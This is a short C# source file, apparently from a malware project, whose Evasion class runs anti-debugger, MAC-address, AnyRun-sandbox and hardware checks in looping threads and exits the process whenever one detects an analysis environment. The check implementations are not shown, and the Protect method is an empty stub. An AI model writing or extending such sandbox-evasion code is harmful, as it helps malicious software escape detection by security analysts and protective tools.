using LannEvasion.Checks;
using LannLogger;
using Serilog.Core;

namespace LannEvasion; 

public static class Evasion {
    private static Logger Logger = LoggerFactory.CreateLogger("Evasion");
    
    private static List<Check> Checks = new() {
        new AntiDebug(),
        new Mac(),
        new AnyRun(),
        new Hardware()
    };
    
    public static async Task RunCheck() {
        Logger.Information("Running evasion check");

        foreach (Check check in Checks) {
            Thread t = new(new ThreadStart(async () => {
                while (true) {
                    if (await check.Run())
                        Environment.Exit(0);
                    Thread.Sleep(5000);
                }
            }));
            t.Start();
        }
    }

    public static async Task Protect() {
        Logger.Verbose("TODO: Protect");
    }
}
